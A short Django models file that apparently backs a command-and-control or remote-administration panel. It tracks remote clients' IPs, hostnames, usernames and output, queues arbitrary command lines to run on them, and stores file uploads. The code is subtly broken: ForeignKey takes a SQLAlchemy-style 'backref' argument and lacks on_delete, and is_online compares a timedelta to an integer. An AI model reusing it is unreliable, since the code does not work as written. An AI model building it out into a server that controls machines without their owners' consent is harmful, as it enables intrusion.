import datetime
from django.db import models
from django.utils import timezone
from django.contrib.auth.models import User

class Client(models.Model):
    user = models.ForeignKey(User, backref='clients')
    #Client Info
    last_online = models.DateTimeField(auto_now=True)
    operating_system = models.CharField(max_length=100)
    remote_ip = models.CharField(max_length=100)
    location = models.CharField(max_length=100)
    output = models.TextField()
    hostname = models.CharField(max_length=100)
    username = models.CharField(max_length=100)

    def send_command(self, cmdline):
        cmd = Command()
        cmd.client = self
        cmd.cmdline = cmdline
        cmd.timestamp = datetime.datetime.now()
        cmd.save()

    def is_online(self):
        return(datetime.datetime.now() - self.last_online) < 10

class Command(models.Model):
    client = models.ForeignKey(Client, backref='commands')
    cmdline = models.CharField(max_length=255)
    timestamp = models.DateTimeField(auto_now_add=True)

class Upload(models.Model):
    user = models.ForeignKey(User, backref='uploads')
    timestamp = models.DateTimeField(auto_now_add=True)
    file = models.FileField(upload_to='uploads/')

    def delete(self, *args, **kwargs):
        self.file.delete()
        super().delete(*args, **kwargs)
